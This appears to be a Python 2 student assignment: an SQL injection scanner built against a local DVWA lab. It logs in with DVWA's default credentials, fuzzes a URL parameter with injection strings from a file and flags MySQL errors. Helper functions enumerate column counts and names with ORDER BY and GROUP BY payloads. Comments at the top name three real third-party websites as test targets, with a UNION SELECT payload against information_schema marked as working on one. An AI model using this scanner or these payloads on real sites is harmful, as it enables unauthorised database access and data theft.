import os
import colorama
import urllib
import requests
import getopt
import sys
from threading import Thread
import getopt
import re
import urllib2
import json
from sys import argv
from bs4 import BeautifulSoup

#Testing url: http://www.atrium.com.pk/Shopping.php?ID=1
#Testing url: http://berkeleyrecycling.org/page.php?id=1
#Testing url: http://www.romanianwriters.ro/s.php?id=1 : DAU ', )', 1' or 1=1 union select null, table_name from information_schema.tables# HOAT DONG

session = requests.session()

token = ""
def introduce():
	banner = """
====================================================================
	XAY DUNG CONG CU DO QUET LO HONG SQL INJECTION TREN DVWA
	GIAO VIEN HUONG DAN: TH.S HUYNH THANH TAM
	HO VA TEN: TON THI THANH VAN
	MSSV: N14DCAT005
	LOP: D14CQAT01-N
====================================================================
	"""
	print(colorama.Fore.GREEN + banner + colorama.Fore.RESET)

def loginDVWA():
    #  get user token
	urlLogin = 'http://192.168.253.167/DVWA/login.php' 
	r = session.post(urlLogin)
	parseHTML = BeautifulSoup(r.content,"lxml")
	token = parseHTML.find("input",{"name":"user_token"})['value']
	dataForm = {
		'username':'admin',
		'password':'password',
		'Login':'Login',
		'user_token':token
 	}
	session.post('http://192.168.253.167/DVWA/login.php', data=dataForm)	
	r1 = session.get('http://192.168.253.167/DVWA/index.php')
 	parseHTML = BeautifulSoup((r1.content),"lxml")
	if "Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*" in r1.text:
		print "Login Successfully!!"
	else:
		print "Login Failed!!"

def usage():
	print "Usage: "
	print "-w: url (http://192.168.253.165/DVWA/vulnerabilities/sqli/?id=FUZZ)\n"
	print "-i: injection strings files \n"
	print "example: demosql.py -w http://192.168.253.165/DVWA/vulnerabilities/sqli/?id=FUZZ \n"

def start(argv):
	introduce()
	loginDVWA()
	if len(sys.argv) < 2:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv, "w:i:")
	except getopt.GetoptError:
		print "Error An Arguments"
		sys.exit()
	for opt, arg in opts:
		if opt == "-w":
			url = arg
		elif opt == "-i":
			dictio = arg
	try:
		print "[-] Opening Injections File: " + dictio
		f =	open(dictio, "r")
		name = f.read().splitlines()
	except:
		print "Failed Opening File:	"+dictio+"\n"
		sys.exit()
	launcher(url,name)

def	launcher(url,dictio):
	injected = []
	for sqlinjection in dictio:
		injected.append(url.replace("FUZZ",sqlinjection))
	res	= injector(injected)
	print "\n[+] Detection Results:"
	print "**********************************"
	for	x in res:
		print x.split(";")[0]

def injector(injected):
	errors = ['MySQL', 'error in your SQL']
	results	= []
	for	y in injected:
		print "[-] Testing Errors: "+y
		req = session.get(y)
		for x in errors:
			if req.content.find(x) != -1:
				res = y	+ ";" + x
				results.append(res)
	return results

def	detect_columns(url):
	new_url= url.replace("FUZZ","admin'	order by X--	-")
	y = 1
	while y < 20:
		req = requests.get(new_url.replace("X",str(y)))			
		if req.content.find("Unknown") == -1:
			y+=1
		else:
			break
	return str(y-1)

def	detect_columns_names(url):
	column_names =['username','user','name','pass','passwd','password','id','role','surname','address']
	new_url = url.replace("FUZZ","admin' group	by	X--	-")
	valid_cols = []
	for	name in column_names:
		req = requests.get(new_url.replace("X",name))
		if req.content.find("Unknown") == -1:
			valid_cols.append(name)
		else:
			pass
	return	valid_cols
if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print "Be interrupted by user, killing	all	threads..!!"
